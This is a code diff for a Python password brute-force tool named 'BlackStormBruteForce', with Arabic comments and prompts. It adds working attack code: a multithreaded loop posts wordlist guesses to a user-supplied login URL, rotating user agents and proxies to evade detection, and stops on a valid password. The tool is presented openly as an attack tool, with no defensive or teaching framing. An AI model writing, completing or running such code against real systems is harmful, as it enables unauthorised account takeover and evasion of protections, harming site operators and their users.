@@ -9,7 +9,7 @@ import sys
 import json
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
-Brute force
+
 class BlackStormBruteForce:
     def __init__(self):
         self.session = requests.Session()
@@ -33,7 +33,7 @@ class BlackStormBruteForce:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/>
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
         ]
 
     def clear_screen(self):
@@ -138,3 +138,85 @@ class BlackStormBruteForce:
             )
             return response.status_code == 200
         except:
+            return False
+
+    def brute_force_attack(self, target_url, username, wordlist_path):
+        """هجوم القوة الغاشمة على الهدف"""
+        if not os.path.exists(wordlist_path):
+            print(f"{self.colors['red']}[!] ملف كلمات المرور غير موجود!{self.colors['reset']}")
+            return
+
+        with open(wordlist_path, 'r', encoding='utf-8') as file:
+            passwords = [line.strip() for line in file.readlines()]
+
+        self.print_banner()
+        print(f"{self.colors['cyan']}[*] بدء الهجوم على: {target_url}{self.colors['reset']}")
+        print(f"{self.colors['yellow']}[*] عدد كلمات المرور: {len(passwords)}{self.colors['reset']}")
+
+        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
+            futures = []
+            for password in passwords:
+                futures.append(executor.submit(
+                    self.try_login,
+                    target_url,
+                    username,
+                    password
+                ))
+
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    print(f"\n{self.colors['green']}[+] نجاح! تم العثور على كلمة المرور: {result}{self.colors['reset']}")
+                    self.successful_attempts.append(result)
+                    executor.shutdown(wait=False)
+                    sys.exit(0)
+
+        if not self.successful_attempts:
+            print(f"\n{self.colors['red']}[-] فشل الهجوم! لم يتم العثور على كلمة مرور صالحة.{self.colors['reset']}")
+
+    def try_login(self, target_url, username, password):
+        """محاولة تسجيل الدخول باستخدام كلمة مرور محددة"""
+        try:
+            headers = {
+                'User-Agent': self.get_random_user_agent(),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': target_url,
+                'Connection': 'keep-alive',
+                'Referer': target_url,
+                'Upgrade-Insecure-Requests': '1'
+            }
+
+            proxies = self.rotate_proxy()
+            data = {
+                'username': username,
+                'password': password
+            }
+
+            response = self.session.post(
+                target_url,
+                headers=headers,
+                data=data,
+                proxies=proxies,
+                timeout=self.timeout
+            )
+
+            if response.status_code == 200:
+                if "login failed" not in response.text.lower():
+                    return password
+            return None
+        except:
+            return None
+
+if __name__ == "__main__":
+    tool = BlackStormBruteForce()
+    tool.print_banner()
+
+    target_url = input(f"{tool.colors['cyan']}[*] أدخل رابط الهدف: {tool.colors['reset']}")
+    username = input(f"{tool.colors['cyan']}[*] أدخل اسم المستخدم: {tool.colors['reset']}")
+    wordlist_path = input(f"{tool.colors['cyan']}[*] أدخل مسار ملف كلمات المرور: {tool.colors['reset']}")
+
+    tool.check_proxy_quality()
+    tool.brute_force_attack(target_url, username, wordlist_path)
